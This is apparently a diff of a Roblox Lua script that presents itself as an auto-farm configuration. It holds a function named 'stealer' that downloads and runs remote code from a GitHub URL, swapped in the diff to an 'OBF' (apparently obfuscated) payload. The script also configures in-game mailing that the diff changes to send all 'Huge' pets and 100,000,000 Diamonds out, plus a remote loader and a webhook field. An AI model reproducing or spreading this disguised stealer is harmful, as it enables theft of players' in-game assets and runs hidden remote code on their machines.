@@ -1,25 +1,27 @@
 local function stealer()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/TechCraft1/AutoRank/refs/heads/main/V3"))()                                                         )                              
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TechCraft1/OBF/refs/heads/main/V3"))()                                                         )                              
 end
 local function farm()
  
 getgenv().Config = {
-    ["EquipEnchants"] = {"Lucky Eggs", "Lucky Eggs", "Lucky Eggs", "Strong Pets", "Coins", "Fortune"},
     ["Mailing"] = {
         ["Usernames"] = {""},
         ["Items"] = {
+            ["Currency"] = {
+                ["Diamonds"] = 100000000,
+            },
             ["Egg"] = {
                 ["Huge Machine Egg 4"] = 1,
             },
         },
-        ["MailAllHuges"] = false
+        ["MailAllHuges"] = true
     },
     ["Notifications"] = {
         ["UserID"] = "",
         ["Webhook"] = ""
     }
 }
-loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/ad5066fbca6e5f2c374e725dfc25ffec.lua"))()
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/3598f9e2d0ad9708cf974fac550d63f2.lua"))()
 
 end
 
